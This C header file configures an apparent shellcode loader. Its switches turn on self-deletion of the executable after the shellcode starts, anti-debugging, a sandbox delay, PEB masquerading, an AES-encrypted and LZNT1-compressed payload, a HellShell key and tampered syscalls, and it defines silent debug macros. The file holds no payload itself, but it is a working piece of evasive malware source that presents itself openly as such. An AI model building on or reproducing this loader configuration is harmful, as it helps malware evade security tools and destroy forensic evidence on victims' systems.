#ifndef CONFIG_H
#define CONFIG_H

/* ============ DEBUG ============ */
/* Set to 1 to allocate a console and print step-by-step trace output.
   Set to 0 for silent (production) mode -- no window, no output. */
#define ENABLE_DEBUG_OUTPUT         0

/* ============ ANTI-FORENSICS ============ */
/* Wipe and delete the Loader executable from disk after shellcode starts.
   The file is renamed to an empty NTFS stream (0 bytes) then marked for deletion. */
#define ENABLE_SELF_DESTRUCT        0

/* ============ EVASION LAYERS ============ */
#define ENABLE_ANTI_DEBUG           1
#define ENABLE_SANDBOX_DELAY        0
#define ENABLE_PEB_MASQUERADE       1
#define ENABLE_AES_ENCRYPTION       1
#define ENABLE_HELLSHELL_KEY        1
#define ENABLE_LZNT1_COMPRESS       1
#define ENABLE_TAMPERED_SYSCALLS    1

#define SANDBOX_DELAY_SECONDS       5

/* ============ DEBUG MACRO ============ */
#if ENABLE_DEBUG_OUTPUT
#include <stdio.h>
#define DBG(fmt, ...) printf("[DBG] " fmt "\n", ##__VA_ARGS__)
#define DBG_OK(fmt, ...) printf("[+]  " fmt "\n", ##__VA_ARGS__)
#define DBG_FAIL(fmt, ...) printf("[!]  " fmt "\n", ##__VA_ARGS__)
#define DBG_STEP(fmt, ...) printf("[*]  " fmt "\n", ##__VA_ARGS__)
#else
#define DBG(fmt, ...) ((void)0)
#define DBG_OK(fmt, ...) ((void)0)
#define DBG_FAIL(fmt, ...) ((void)0)
#define DBG_STEP(fmt, ...) ((void)0)
#endif

#endif /* CONFIG_H */
